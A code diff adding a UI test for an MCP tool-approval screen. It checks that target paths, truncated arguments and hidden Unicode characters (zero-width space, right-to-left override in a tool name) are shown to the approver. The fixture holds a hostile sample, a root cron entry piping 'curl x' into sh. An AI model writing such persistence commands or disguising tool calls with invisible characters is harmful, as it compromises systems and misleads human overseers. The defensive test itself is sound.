@@ -189,6 +189,35 @@ describe("the MCP servers of one project, on the project's Integrations page", (
     await waitFor(() => expect(decisions).toEqual([['apr_1', false]]), r);
   });
 
+  // audit 2026-10-16, H8
+  it('shows where an approval goes, says when the arguments are cut, and writes out characters that are not drawn', async () => {
+    const ap: McpApproval = {
+      id: 'apr_2',
+      server: 'tst',
+      tool: 'wr\u202Eite',
+      agentId: 'agt_1',
+      args: '{"path":"/etc/cron.d/job\u200B","body":"* * * * * root curl x|sh...[90210 bytes not shown]...done"}',
+      targets: ['/etc/cron.d/job\u200B'],
+      shortened: true,
+      created: 1760000000000,
+      expiresAt: 1760001800000,
+      projectId: 'prj_1',
+    };
+    const r = show({ mcpServerList: async () => [projServer()], mcpApprovalList: async () => [ap] });
+    const box = await waitFor(() => {
+      const b = r.$('[data-testid="mcp-approval"]');
+      if (!b) throw new Error('not yet');
+      return b as HTMLElement;
+    }, r);
+    expect(box.querySelector('[data-testid="mcp-approval-targets"]')!.textContent).toBe('/etc/cron.d/job\\u{200b}');
+    expect(box.querySelector('[data-testid="mcp-approval-shortened"]')!.textContent).toContain('Part of this input is not shown');
+    expect(box.querySelector('[data-testid="mcp-approval-hidden"]')).not.toBeNull();
+    expect(box.querySelector('h3')!.textContent).toContain('wr\\u{202e}ite');
+    expect(box.querySelector('pre')!.textContent).toContain('/etc/cron.d/job\\u{200b}');
+    expect(box.textContent).not.toContain('\u202E');
+    expect(box.textContent).not.toContain('\u200B');
+  });
+
   it('read-only: approving and turning on or off are disabled, rejecting is not', async () => {
     const ap: McpApproval = { id: 'apr_1', server: 'tst', tool: 'post_note', agentId: 'agt_1', args: '{}', created: 1, expiresAt: 2, projectId: 'prj_1' };
     const r = show({ licenseStatus: async () => expiredLicense, mcpServerList: async () => [projServer()], mcpApprovalList: async () => [ap] });
